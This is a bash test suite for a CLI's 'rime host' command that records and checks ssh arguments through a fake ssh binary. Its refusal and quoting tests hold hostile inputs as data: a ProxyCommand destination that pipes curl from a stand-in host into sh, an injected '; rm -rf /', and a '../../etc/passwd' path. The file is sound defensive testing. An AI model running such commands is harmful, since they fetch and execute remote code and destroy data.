#!/usr/bin/env bash
# ─────────────────────────────────────────────────────────────────────────────
#  test-rime-host.sh — assertions against the REAL `rime` binary for
#  `rime host` (roadmap §20's trusted devices).
#
#  Nothing here re-implements the CLI: every case runs the real built binary as
#  a process. It is a DEBUG build from this tree — RIME_BIN defaults to
#  rimed/target/debug/rime and the suite builds it if it is missing. The image
#  installs rimed/target/release/rime (Containerfile.base), which is the same
#  source and a different binary. Point RIME_BIN at a release build to assert
#  against one; the header used to claim that was already happening.
#
#  ── Why a fake `ssh` is the centre of this suite ───────────────────────────
#  `rime host` exists to run commands on other machines, so the interesting
#  assertions are all about *what it would have run*. A fake `ssh` placed first
#  on PATH records its argv and lets this suite check the things that matter
#  and cannot be checked any other way:
#
#    * `BatchMode=yes` is always passed, so a dispatch can never sit waiting on
#      a password prompt. This is also what keeps Rime from producing the
#      credential prompt the developer has asked twice never to see.
#    * `StrictHostKeyChecking` is never weakened. The assertion is an ABSENCE,
#      which is exactly the kind a suite normally forgets: `accept-new` in a
#      background probe would pin a host key nobody looked at.
#    * `--` precedes the destination, so a destination could not become an
#      option even if validation were bypassed.
#    * The remote command keeps its argument boundaries. `ssh host ls "/a b"`
#      does NOT run `ls` with one argument — ssh joins its remote arguments
#      with spaces and hands the string to the remote login shell — so Rime
#      quotes for that shell itself, and this proves it.
#
#  It also means the suite touches no network and no other machine. A real ssh
#  here would make the run depend on whether the developer is at home.
#
#  ── What it deliberately does NOT do ────────────────────────────────────────
#  No root, no network, no writes outside a temp directory, and no read or
#  write of the developer's own ~/.config/rime/hosts.toml — XDG_CONFIG_HOME and
#  XDG_STATE_HOME are redirected into $WORK, and there is an assertion that the
#  real one was left alone, because a suite that clobbered it would be a bug
#  report about lost devices rather than a test failure.
#
#  PASS = every verb behaves, every refusal refuses with a message that says
#         where the setting lives, the ssh argv is exactly what it should be,
#         and no real ssh ran.
#
#  Run from anywhere: ./tests/test-rime-host.sh
# ─────────────────────────────────────────────────────────────────────────────
set -uo pipefail
# grep -q exits at its first match; under pipefail a producer that is still
# writing then fails (EPIPE, or 141 from SIGPIPE) and so does the pipeline,
# at random. pipe_has reads its input to the end.
pipe_has() { grep "$@" >/dev/null; }
# `set +e` for the same reason as every other suite here: this one COUNTS
# failures instead of aborting, and many assertions run commands that exit
# non-zero on purpose. GitHub Actions invokes a script as `bash -e {0}`, and
# under `-e` the first such command ends the script — silently truncating the
# run rather than reporting anything.
set +e
cd "$(dirname "$0")" || exit 2
REPO=$(cd .. && pwd)

pass=0; fail=0
ok()  { printf 'PASS  %-58s\n' "$1"; pass=$((pass+1)); }
bad() { printf 'FAIL  %-58s %s\n' "$1" "$2"; fail=$((fail+1)); }
section() { printf '\n── %s ──\n' "$1"; }

# Compare two files without an external binary.
#
# This used `diff -q`, and `diff` is diffutils — which is NOT installed in the
# container CI builds in. There, `diff -q` exited 127, the test read that as
# "the files differ", and the suite reported that the developer's own state had
# been modified when nothing had touched it.
#
# A false alarm this time. The same shape produces a false PASS the moment the
# comparison is written the other way round, and nothing asserted the binary was
# there — which is the rule these suites already state for prerequisites and did
# not follow for this one.
#
# Command substitution strips trailing newlines from both sides equally, so
# equality is unaffected. These are small text files by construction.
same_file() {
    [ "$(cat "$1" 2>/dev/null)" = "$(cat "$2" 2>/dev/null)" ]
}

# A missing prerequisite is a FAILURE, never a skip. A suite that reports
# "0 passed, 0 failed" and a green tick has asserted precisely nothing, which
# has happened in this repository before.
command -v python3 >/dev/null 2>&1 || {
    echo "FATAL: python3 is required to validate the JSON output" >&2
    exit 2
}

# ── locate (or build) the binary under test ─────────────────────────────────
RIME_BIN=${RIME_BIN:-$REPO/rimed/target/debug/rime}
if [ ! -x "$RIME_BIN" ]; then
    echo "building the rime binary (not found at $RIME_BIN)…"
    ( cd "$REPO/rimed" && cargo build --locked --bin rime ) || {
        echo "FATAL: could not build the rime binary; nothing below can run" >&2
        exit 2
    }
fi
[ -x "$RIME_BIN" ] || { echo "FATAL: no rime binary at $RIME_BIN" >&2; exit 2; }

WORK=$(mktemp -d /tmp/rime-host-test.XXXXXX)
trap 'rm -rf "$WORK"' EXIT

# ── the developer's own registry must be untouched ──────────────────────────
# Captured before anything runs. Compared at the end. If `rime host` ever
# resolved its paths from $HOME instead of $XDG_CONFIG_HOME, this is what
# catches it — and the cost of not catching it is someone's device list.
REAL_REG="${XDG_CONFIG_HOME:-$HOME/.config}/rime/hosts.toml"
REAL_BEFORE=$WORK/real-registry-before
if [ -f "$REAL_REG" ]; then cp "$REAL_REG" "$REAL_BEFORE"; else : > "$REAL_BEFORE"; fi

export XDG_CONFIG_HOME=$WORK/config
export XDG_STATE_HOME=$WORK/state

# ── the fake ssh ────────────────────────────────────────────────────────────
# Records its full argv, one invocation per file so ordering and count are both
# checkable, and answers the probe the way a chosen scenario dictates.
SSHLOG=$WORK/ssh-invocations
mkdir -p "$SSHLOG"
FAKEBIN=$WORK/fakebin
mkdir -p "$FAKEBIN"

cat > "$FAKEBIN/ssh" <<'EOF'
#!/usr/bin/env bash
# Record argv with one argument per line, so an argument containing a space is
# distinguishable from two arguments — which is the entire point of the
# quoting assertions below.
n=$(ls "$SSHLOG" | wc -l)
out="$SSHLOG/$(printf '%03d' "$n")"
for a in "$@"; do printf '%s\n' "$a" >> "$out"; done

# The scenario decides what the far side "answered".
case "${SSH_SCENARIO:-shell}" in
  describe)
    # A Rime peer that knows `host describe`. Only answer that verb.
    if printf '%s\n' "$@" | grep -q "host' 'describe"; then
      echo '{"probed_at":1,"rime_version":"9.9.9","variant":"gaming","os":"Rime OS","cpus":20,"memory_mib":63997,"gpus":["nvidia"],"accel":["cuda"],"agentd":true,"ai":true,"podman":true}'
      exit 0
    fi
    exit 0
    ;;
  shell)
    # A host with no rime: the describe attempt fails, the shell probe answers.
    if printf '%s\n' "$@" | grep -q "host' 'describe"; then
      echo "error: unrecognized subcommand 'host'" >&2
      exit 2
    fi
    printf 'os=Fedora Linux 43 (Workstation Edition)\nvariant=workstation\ncpus=8\nmemory_mib=16000\npodman=1\n'
    exit 0
    ;;
  dead)
    # Unreachable: nothing on stdout, non-zero exit.
    echo "ssh: connect to host port 22: Connection refused" >&2
    exit 255
    ;;
  exitcode)
    # For proving `rime host run` propagates the remote status.
    exit 42
    ;;
esac
EOF
chmod +x "$FAKEBIN/ssh"
export SSHLOG
export PATH="$FAKEBIN:$PATH"

# Every invocation goes through here, so the fake ssh is not something a new
# case can forget to opt into.
rime() { "$RIME_BIN" "$@" 2>&1; }
sshcount() { ls "$SSHLOG" | wc -l | tr -d ' '; }
resetssh() { rm -rf "$SSHLOG"; mkdir -p "$SSHLOG"; }
lastargv() { cat "$SSHLOG/$(ls "$SSHLOG" | tail -1)"; }

# ── prove the fake ssh is actually the one being used ───────────────────────
# Without this, every assertion below could be passing because no ssh ran at
# all. This repository has shipped a check that was satisfied by its own
# comments; a tripwire that is never armed is the same failure.
section "the harness itself"
resetssh
rime host add probe-me --no-probe >/dev/null
rime host probe probe-me >/dev/null
if [ "$(sshcount)" -ge 1 ]; then
    ok "the fake ssh is on PATH and was invoked"
else
    bad "the fake ssh is on PATH and was invoked" "nothing was recorded — every ssh assertion below would be vacuous"
fi
if [ "$(command -v ssh)" = "$FAKEBIN/ssh" ]; then
    ok "ssh resolves to the fake, not the system one"
else
    bad "ssh resolves to the fake, not the system one" "$(command -v ssh)"
fi

# ── describe ────────────────────────────────────────────────────────────────
section "rime host describe"
out=$(rime host describe --json)
if python3 -c "
import json,sys
d=json.loads(sys.argv[1])
assert isinstance(d.get('rime_version'), str), 'rime_version missing'
assert isinstance(d.get('cpus'), int) and d['cpus'] >= 1, 'cpus missing'
assert isinstance(d.get('probed_at'), int), 'probed_at missing'
" "$out" 2>/dev/null; then
    ok "describe --json reports a version, a cpu count and a timestamp"
else
    bad "describe --json reports a version, a cpu count and a timestamp" "$out"
fi

# The struct on the wire is the one the other end parses. If a field were
# renamed on only one side this is what would catch it.
#
# Only the fields that are ALWAYS serialised. `gpus` and `accel` carry
# `skip_serializing_if = "Vec::is_empty"`, so a machine with no accelerator
# omits them entirely — which is the intended behaviour, not a gap: a host
# that cannot demonstrate a capability reports it absent rather than as an
# empty list. This suite asserted `accel` unconditionally and passed on the
# developer's AMD laptop, where /dev/kfd makes rocm real, then failed on a
# GitHub runner with a hyperv_drm display and no accelerator at all. The
# assertion was "works on my machine" in one line.
for field in rime_version cpus probed_at podman agentd ai; do
    if printf '%s' "$out" | pipe_has "\"$field\""; then
        ok "describe --json always carries $field"
    else
        bad "describe --json always carries $field" "absent from $out"
    fi
done

# And the conditional ones: absent is legal, but a present one must be an
# array, because that is what the far side deserialises into a Vec.
if python3 -c "
import json,sys
d=json.loads(sys.argv[1])
for k in ('gpus','accel'):
    if k in d:
        assert isinstance(d[k], list), f'{k} is not an array'
        assert d[k], f'{k} is present but empty, which should have been omitted'
" "$out" 2>/dev/null; then
    ok "gpus and accel are omitted when empty, never present-and-empty"
else
    bad "gpus and accel are omitted when empty" "$out"
fi

if rime host describe | pipe_has "Rime"; then
    ok "describe without --json is human-readable"
else
    bad "describe without --json is human-readable" "$(rime host describe)"
fi

# ── add, and the ssh argv it produces ───────────────────────────────────────
section "the ssh command line"
resetssh
SSH_SCENARIO=describe rime host add katana --note "build box" >/dev/null
argv=$(lastargv)

if printf '%s\n' "$argv" | pipe_has -x "BatchMode=yes"; then
    ok "BatchMode=yes is always passed, so a dispatch cannot block on a prompt"
else
    bad "BatchMode=yes is always passed" "$(printf '%s' "$argv" | tr '\n' ' ')"
fi

if printf '%s\n' "$argv" | pipe_has "^ConnectTimeout="; then
    ok "a connect timeout is always passed, so an absent host fails fast"
else
    bad "a connect timeout is always passed" "$(printf '%s' "$argv" | tr '\n' ' ')"
fi

# An ABSENCE assertion. `accept-new` would silently pin an unverified key.
if printf '%s\n' "$argv" | pipe_has "StrictHostKeyChecking"; then
    bad "host-key checking is never weakened" "argv contains StrictHostKeyChecking"
else
    ok "host-key checking is never weakened (no StrictHostKeyChecking at all)"
fi

# `--` must come immediately before the destination.
if printf '%s\n' "$argv" | grep -A1 -x -- "--" | tail -1 | pipe_has -x "katana"; then
    ok "-- precedes the destination, so it cannot be read as an option"
else
    bad "-- precedes the destination" "$(printf '%s' "$argv" | tr '\n' ' ')"
fi

if printf '%s\n' "$argv" | pipe_has -x -- "-T"; then
    ok "a probe asks for no tty"
else
    bad "a probe asks for no tty" "$(printf '%s' "$argv" | tr '\n' ' ')"
fi

# ── the two probe paths ─────────────────────────────────────────────────────
section "probing"
resetssh
out=$(SSH_SCENARIO=describe rime host probe katana)
if printf '%s' "$out" | pipe_has "Rime 9.9.9" && printf '%s' "$out" | pipe_has "gaming"; then
    ok "a Rime peer's self-description is used"
else
    bad "a Rime peer's self-description is used" "$out"
fi
if printf '%s' "$out" | pipe_has "cuda" && printf '%s' "$out" | pipe_has "ai"; then
    ok "the peer's accelerators and services are reported"
else
    bad "the peer's accelerators and services are reported" "$out"
fi

resetssh
out=$(SSH_SCENARIO=shell rime host probe katana)
if printf '%s' "$out" | pipe_has "Fedora Linux 43"; then
    ok "a host with no rime falls back to the portable shell probe"
else
    bad "a host with no rime falls back to the portable shell probe" "$out"
fi
if printf '%s' "$out" | pipe_has "8 cpu"; then
    ok "the fallback still reports what it could read"
else
    bad "the fallback still reports what it could read" "$out"
fi
# Two ssh calls: the describe attempt, then the shell probe.
if [ "$(sshcount)" = "2" ]; then
    ok "the fallback is a second ssh, not a guess"
else
    bad "the fallback is a second ssh, not a guess" "$(sshcount) invocations"
fi

resetssh
out=$(SSH_SCENARIO=dead rime host probe katana)
if printf '%s' "$out" | pipe_has -i "unreachable"; then
    ok "an unreachable host is reported, not crashed on"
else
    bad "an unreachable host is reported, not crashed on" "$out"
fi
SSH_SCENARIO=dead rime host probe katana >/dev/null
if [ "$?" -ne 0 ]; then
    ok "probing a single dead host exits non-zero, so it is usable as a check"
else
    bad "probing a single dead host exits non-zero" "exit 0"
fi
# A failed probe must not destroy what the last successful one learned. The
# host being off the LAN is the normal case on a laptop, and forgetting its
# capabilities every time would make the cache useless exactly when it matters.
if rime host show katana | pipe_has "8 cpu"; then
    ok "a failed probe leaves the last known-good result in place"
else
    bad "a failed probe leaves the last known-good result in place" "$(rime host show katana)"
fi

# --no-probe must not touch the network at all.
resetssh
rime host add offline --no-probe >/dev/null
if [ "$(sshcount)" = "0" ]; then
    ok "--no-probe runs no ssh at all"
else
    bad "--no-probe runs no ssh at all" "$(sshcount) invocations"
fi

# ── quoting: the reason this module exists ──────────────────────────────────
section "argument boundaries on the remote"
resetssh
rime host run katana -- ls "/a b" >/dev/null 2>&1
remote=$(lastargv | tail -1)
if [ "$remote" = "'ls' '/a b'" ]; then
    ok "a path with a space stays one remote argument"
else
    bad "a path with a space stays one remote argument" "got [$remote]"
fi

resetssh
rime host run katana -- echo "; rm -rf /" >/dev/null 2>&1
remote=$(lastargv | tail -1)
if [ "$remote" = "'echo' '; rm -rf /'" ]; then
    ok "a shell metacharacter is data, not a command"
else
    bad "a shell metacharacter is data, not a command" "got [$remote]"
fi

resetssh
rime host run katana -- printf "it's" >/dev/null 2>&1
remote=$(lastargv | tail -1)
if [ "$remote" = "'printf' 'it'\\''s'" ]; then
    ok "an embedded single quote is escaped the one way that works"
else
    bad "an embedded single quote is escaped the one way that works" "got [$remote]"
fi

# The whole remote command must be ONE ssh argument. If it were several, ssh
# would join them with spaces and undo the quoting above.
resetssh
rime host run katana -- ls "/a b" >/dev/null 2>&1
if [ "$(lastargv | grep -c "^'ls'")" = "1" ]; then
    ok "the remote command reaches ssh as exactly one argument"
else
    bad "the remote command reaches ssh as exactly one argument" "$(lastargv | tr '\n' '|')"
fi

# -t must reach ssh for an interactive session.
resetssh
rime host run katana -t -- top >/dev/null 2>&1
if lastargv | pipe_has -x -- "-t"; then
    ok "--tty asks ssh for a terminal"
else
    bad "--tty asks ssh for a terminal" "$(lastargv | tr '\n' ' ')"
fi

# exec, not spawn: the remote exit status must become ours.
SSH_SCENARIO=exitcode "$RIME_BIN" host run katana -- whatever >/dev/null 2>&1
rc=$?
if [ "$rc" = "42" ]; then
    ok "the remote exit status becomes rime's own"
else
    bad "the remote exit status becomes rime's own" "got $rc, expected 42"
fi

# ── refusals ────────────────────────────────────────────────────────────────
section "refusals"
resetssh
out=$(rime host add -- --ssh "-oProxyCommand=curl evil|sh" 2>&1)
if [ "$?" -ne 0 ] || printf '%s' "$out" | pipe_has -i "option"; then
    ok "an option-like ssh destination is refused"
else
    bad "an option-like ssh destination is refused" "$out"
fi
if [ "$(sshcount)" = "0" ]; then
    ok "a refused destination never reaches ssh"
else
    bad "a refused destination never reaches ssh" "$(sshcount) invocations"
fi

out=$(rime host add "../../etc/passwd" --no-probe 2>&1)
if [ "$?" -ne 0 ]; then
    ok "a traversing host name is refused"
else
    bad "a traversing host name is refused" "$out"
fi

out=$(rime host show nosuchhost 2>&1)
if printf '%s' "$out" | pipe_has "katana"; then
    ok "an unknown host names the ones that do exist"
else
    bad "an unknown host names the ones that do exist" "$out"
fi

out=$(rime host probe katana --all 2>&1)
if [ "$?" -ne 0 ] && printf '%s' "$out" | pipe_has -i "not both"; then
    ok "a name and --all together is refused rather than guessed at"
else
    bad "a name and --all together is refused" "$out"
fi

# ── the refused keys, hand-edited into the registry ─────────────────────────
section "keys that exist only to be refused"
REG=$XDG_CONFIG_HOME/rime/hosts.toml
check_refusal() {
    local key=$1 value=$2 want=$3 label=$4
    # Back up before touching a config, per AGENTS.md — even a test's own.
    cp "$REG" "$REG.bak"
    printf '\n[host.refused]\n%s = %s\n' "$key" "$value" >> "$REG"
    local out; out=$(rime host list 2>&1)
    local rc=$?
    cp "$REG.bak" "$REG"
    if [ "$rc" -ne 0 ] && printf '%s' "$out" | pipe_has "$want"; then
        ok "$label"
    else
        bad "$label" "rc=$rc out=$out"
    fi
}
check_refusal identity_file '"~/.ssh/id_ed25519"' "ssh/config" \
    "identity_file is refused and points at ~/.ssh/config"
check_refusal strict_host_key_checking '"no"' "never weakens" \
    "weakening host-key checking is refused"
check_refusal ssh_options '["-oX=y"]' "ssh_options" \
    "free-form ssh options are refused"

# An unknown key is a typo in this file, because it has exactly one program
# writer. deny_unknown_fields must be load-bearing.
cp "$REG" "$REG.bak"
printf '\n[host.typo]\nsssh = "x"\n' >> "$REG"
out=$(rime host list 2>&1); rc=$?
cp "$REG.bak" "$REG"
if [ "$rc" -ne 0 ]; then
    ok "an unknown key in the registry is refused, not ignored"
else
    bad "an unknown key in the registry is refused, not ignored" "$out"
fi

# A future version must refuse rather than guess -- and say what to do about it.
#
# Section 25: a registry from a newer Rime is what a `bootc rollback` leaves
# behind, because hosts.toml lives under $XDG_CONFIG_HOME and does not roll
# back with the image. So the refusal has to name the remedy, not only the
# mismatch. The same case for tasks.toml (test-rime-task.sh) shipped red for
# three rounds because it pinned the OLD phrase, "understands up to", and
# P1-045 changed the message under it. This one is asserted in the same four
# parts as the Rust unit test beside the message
# (`host.rs::a_future_version_is_refused_rather_than_guessed_at`), so the two
# halves of one claim go stale together rather than one at a time.
cp "$REG" "$REG.bak"
python3 - "$REG" <<'PY'
import sys, pathlib
p = pathlib.Path(sys.argv[1])
p.write_text("version = 99\n" + p.read_text())
PY
out=$(rime host list 2>&1); rc=$?
cp "$REG.bak" "$REG"
# `reads version [0-9]+` rather than `reads version 1`: the version this build
# understands is the one thing here that is expected to change, and pinning it
# is how the task case went stale in the first place.
missing=
[ "$rc" -ne 0 ] || missing="$missing rc=$rc"
for part in 'version 99' 'reads version [0-9]+' 'rollback' 'Boot the newer deployment'; do
    printf '%s' "$out" | pipe_has -E "$part" || missing="$missing [$part]"
done
if [ -z "$missing" ]; then
    ok "a registry from a newer rime is refused, with both versions and the remedy"
else
    bad "a registry from a newer rime is refused, with both versions and the remedy" \
        "missing:$missing out=$out"
fi

# ── list and its empty state ────────────────────────────────────────────────
section "list"
# Re-probed here on purpose. The first version of this case asserted the
# describe-scenario values while the previous section had left the shell-probe
# result in the cache — the assertion was reading state it did not set.
resetssh
SSH_SCENARIO=describe rime host probe katana >/dev/null
out=$(rime host list --json)
if python3 -c "
import json,sys
d=json.loads(sys.argv[1])
assert 'katana' in d, 'katana missing'
assert d['katana']['ssh'] == 'katana', 'destination wrong'
assert d['katana']['caps']['rime_version'] == '9.9.9', 'cached caps not returned'
" "$out" 2>/dev/null; then
    ok "list --json carries the destination and the cached probe"
else
    bad "list --json carries the destination and the cached probe" "$out"
fi

EMPTY=$WORK/empty
out=$(XDG_CONFIG_HOME=$EMPTY XDG_STATE_HOME=$EMPTY rime host list)
if [ "$?" = "0" ] && printf '%s' "$out" | pipe_has -i "no trusted devices"; then
    ok "no registry at all is an empty list, not an error"
else
    bad "no registry at all is an empty list, not an error" "$out"
fi
if printf '%s' "$out" | pipe_has "rime host add"; then
    ok "the empty state says how to add a device"
else
    bad "the empty state says how to add a device" "$out"
fi

# An unprobed host must not read as capable.
out=$(rime host show offline)
if printf '%s' "$out" | pipe_has -i "not probed"; then
    ok "an unprobed host says so rather than looking capable"
else
    bad "an unprobed host says so rather than looking capable" "$out"
fi

# ── remove ──────────────────────────────────────────────────────────────────
section "remove"
rime host remove offline >/dev/null
if rime host list --json | python3 -c "
import json,sys
assert 'offline' not in json.load(sys.stdin)
" 2>/dev/null; then
    ok "remove takes the entry out of the registry"
else
    bad "remove takes the entry out of the registry" "$(rime host list)"
fi
if [ ! -f "$XDG_STATE_HOME/rime/hosts/offline.json" ]; then
    ok "remove also drops the cached probe"
else
    bad "remove also drops the cached probe" "cache file still present"
fi
out=$(rime host remove nosuchhost 2>&1)
if [ "$?" -ne 0 ]; then
    ok "removing a host that does not exist is an error, not a no-op"
else
    bad "removing a host that does not exist is an error" "$out"
fi

# ── the registry file itself ────────────────────────────────────────────────
section "the registry on disk"
if grep -q "Hand-editable" "$REG"; then
    ok "the written registry explains itself to whoever opens it"
else
    bad "the written registry explains itself" "$(head -3 "$REG")"
fi
# No temp file may survive a write. A glob rather than `ls | grep`: it answers
# the question directly and does not care what the filenames contain.
shopt -s nullglob
leftover=("$XDG_CONFIG_HOME"/rime/*.tmp.*)
shopt -u nullglob
if [ "${#leftover[@]}" -eq 0 ]; then
    ok "no temp file is left behind by an atomic write"
else
    bad "no temp file is left behind" "${leftover[*]}"
fi
# The cache directory must not be world-readable: it names the machines this
# user can reach.
mode=$(stat -c %a "$XDG_STATE_HOME/rime/hosts" 2>/dev/null)
if [ "$mode" = "700" ]; then
    ok "the probe cache directory is private (700)"
else
    bad "the probe cache directory is private" "mode $mode"
fi

# ── the developer's own registry ────────────────────────────────────────────
section "the machine running the tests"
if [ -f "$REAL_REG" ]; then cp "$REAL_REG" "$WORK/real-registry-after"; else : > "$WORK/real-registry-after"; fi
if same_file "$REAL_BEFORE" "$WORK/real-registry-after"; then
    ok "the developer's own hosts.toml was not touched"
else
    bad "the developer's own hosts.toml was not touched" "IT CHANGED — see $REAL_REG"
fi

printf '\nrime host: %d passed, %d failed\n' "$pass" "$fail"
[ "$fail" -eq 0 ] || exit 1
